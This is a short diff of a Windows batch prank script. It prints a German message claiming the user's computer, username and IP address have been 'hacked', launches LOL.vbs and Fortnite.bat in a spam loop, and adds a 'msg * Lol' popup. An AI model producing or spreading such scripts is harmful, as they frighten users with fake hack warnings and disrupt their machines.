@@ -15,3 +15,4 @@ echo Computer Mit Username: %username% und IPv4:%ip% Wurde Gehackt
 start LOL.vbs
 start Fortnite.bat
 goto Spamm
+msg * Lol
